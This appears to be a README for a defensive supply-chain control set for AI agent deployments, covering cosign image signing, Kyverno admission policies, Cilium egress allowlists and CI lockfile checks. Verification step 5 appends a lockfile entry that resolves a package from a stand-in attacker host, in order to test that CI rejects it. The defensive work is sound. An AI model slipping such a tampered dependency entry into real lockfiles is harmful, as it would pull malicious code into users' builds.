# Supply chain / Server-side

**Control.** Image registry restrictions in admission policy. OCI signature verification (cosign). SBOM admission requirements. Egress NetworkPolicy to approved registries only. OPA policy denying images without provenance attestation. SLSA build-provenance attestation gates. MCP domain allowlist enforced at the network layer. Server-side lockfile-integrity validation.

**Strength.** Deterministic at admission. Bypass requires compromise of signing infrastructure (KMS key theft), signature stripping at a registry mirror, policy misconfigured to allow unsigned images in some namespaces ("the tools namespace exception"), or cosign trust policy with `subject: "*"` accepting anyone's keyless signature.

## Tooling

- Cosign for OCI signing and verification.
- Syft and Grype (or Trivy) for SBOM generation and scanning.
- Kyverno 1.18+ or OPA Gatekeeper for admission control.
- A signing key managed in KMS (AWS KMS, GCP KMS, or HashiCorp Vault) — or keyless signing via GitHub OIDC + Sigstore.
- A SLSA provenance generator (`slsa-github-generator`).
- Cilium with FQDN policy support (or another CNI that enforces L7 DNS at egress).

## Files in this directory

- [`build-and-sign.yml`](./build-and-sign.yml) — GitHub Actions workflow that builds the agent image, signs it with `cosign --yes` (keyless), generates an SPDX SBOM with `syft`, and attaches the SBOM as a cosign attestation. Drop in `.github/workflows/`.
- [`kyverno-verify-image-signatures.yaml`](./kyverno-verify-image-signatures.yaml) — Kyverno ClusterPolicy verifying cosign signatures from a specific GitHub OIDC subject and verifying the SPDX attestation. Requires Kyverno 1.18+ for the `attestors`/`entries`/`keyless` block shape.
- [`kyverno-require-sbom.yaml`](./kyverno-require-sbom.yaml) — Kyverno ClusterPolicy requiring an SPDX SBOM attestation on every image and verifying it was created by `syft` (heuristic; tune for your build).
- [`cilium-mcp-fqdn-egress.yaml`](./cilium-mcp-fqdn-egress.yaml) — CiliumNetworkPolicy restricting agent egress to a fixed list of approved FQDNs (api.anthropic.com, api.github.com, registry.example.com). Requires Cilium with `enable-l7-proxy: true` or DNS denials are not enforced.
- [`lockfile-integrity.yml`](./lockfile-integrity.yml) — CI workflow that runs `npm ci --dry-run`, `pip-compile --check`, and `pip-audit` regardless of whether pre-commit was used locally. **The real backstop for client-side lockfile pinning.**

## Verification

```bash
# 1. Confirm unsigned image is rejected
kubectl run test --image=docker.io/alpine
# expected: rejected by verify-cosign-signature

# 2. Confirm signed image is accepted
# Replace the digest with a real signed agent image digest from your registry.
kubectl run test --image=ghcr.io/example-org/claude-agent@sha256:9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f
# expected: success if signature and SBOM attestation are present

# 3. Confirm FQDN egress allowlist
kubectl exec -n agent-claude-prod claude-code -- \
  curl -sS --max-time 5 https://example.com
# expected: failure (example.com not in allowlist)

# 4. Confirm SBOM attestation present on a built image
cosign tree ghcr.io/example-org/claude-agent@sha256:9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f
# expected: SPDX attestation in the tree

# 5. Confirm lockfile validation catches a hand-edited lockfile
echo '"resolved": "https://attacker.example.com/evil-1.0.0.tgz"' >> package-lock.json
gh pr create
# expected: CI fails at npm ci --dry-run
```

## Common mistakes

- Cosign verification configured for a single namespace; agents in other namespaces deploy unsigned images.
- Keyless signing trust policy with `subject: "*"` accepts anyone's keyless signature.
- FQDN allowlist enforced by Cilium but the cluster default CNI fails open when Cilium is restarted.
- SBOM required but not validated against vulnerability scan; you have provenance for the malicious package.
- Server-side lockfile check runs after merge, not before. The bad version is already in main.

## Citation

NIST CSF 2.0 PR.PS-02, PR.PS-05 (unauthorized software prevented), PR.IR-01, GV.SC-07 (risks from suppliers identified, recorded, prioritized, assessed, responded to, monitored), ID.RA-09 (authenticity and integrity of hardware and software assessed prior to acquisition and use). NIST AI RMF MAP 4.1, MANAGE 3.1. OWASP LLM03, LLM04. OWASP ASI04. NIST SP 800-218 PS.3 (archive and protect each software release). NIST SP 800-161 Rev. 1 (supply chain risk management). SLSA framework. CISA/NSA/FBI AI Data Security CSI (May 2025). CISA/ASD ACSC "Principles for Secure Integration of AI in OT" (Dec 2025). OWASP MCP04, MCP09.
